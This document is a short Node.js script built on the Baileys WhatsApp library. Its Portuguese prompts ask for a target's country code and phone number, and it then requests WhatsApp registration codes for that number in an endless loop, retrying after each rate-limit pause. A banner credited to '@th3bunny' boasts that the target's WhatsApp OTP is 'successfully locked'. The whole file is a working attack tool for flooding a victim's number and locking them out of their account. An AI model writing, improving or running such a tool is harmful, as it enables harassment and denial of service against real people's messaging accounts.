const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs')


const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('./files/numbers.json'));

const start = async () => {

  const { state, saveCreds } = await useMultiFileAuthState('.oiii')

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  })
  //console.clear();
  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
    //console.clear();
      try {
      //console.log(gradient('red', 'red')('💀■■■■■■■💀 +' + ddi + number))
      console.clear();
      console.log(gradient('red')('𝐘𝐎𝐔𝐑 𝐓𝐀𝐑𝐆𝐄𝐓 𝐍𝐔𝐌𝐁𝐄𝐑 𝐖𝐀 𝐎𝐓𝐏 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐋𝐎𝐂𝐊𝐄𝐃 ,𝐁𝐘 @th3bunny' + ddi + number))
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        })
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          //console.log(gradient('gray', 'gray')(`Número derrubado: +${res.login}`));
          setTimeout(async () => {
            dropNumber(context)
          }, res.retry_after * 1000)
          return;
        }
      } catch (error) {
        //console.log(error)
      }
    }

  }
  console.clear();
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  let ddi = prompt(gradient('purple', 'cyan')('[+] Digite o ddi do alvo: '));
  let number = prompt(gradient('purple', 'cyan')('[+] Digite o número do alvo: '))
  let phoneNumber = ddi + number;
  numbers[phoneNumber] = { ddi, number }
  fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));
  dropNumber({ phoneNumber, ddi, number })
console.clear();
}
start();
